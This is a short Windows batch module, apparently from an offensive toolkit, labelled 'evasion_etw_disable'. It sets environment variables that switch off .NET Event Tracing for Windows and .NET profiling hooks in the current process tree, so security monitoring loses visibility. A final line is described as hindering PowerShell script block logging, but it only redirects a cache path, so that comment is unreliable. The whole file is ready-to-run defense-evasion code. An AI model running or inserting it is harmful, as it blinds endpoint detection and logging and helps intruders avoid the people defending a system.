REM provides: evasion_etw_disable
REM depends: (none)
REM description: Disable ETW tracing in current process environment

REM Disable .NET ETW provider for current process tree
set "COMPLUS_ETWEnabled=0"
set "COMPlus_ETWEnabled=0"

REM Disable .NET profiling hooks
set "COR_ENABLE_PROFILING=0"
set "CORECLR_ENABLE_PROFILING=0"

REM Disable script block logging environment hint
set "PSModuleAnalysisCachePath=%TEMP%"
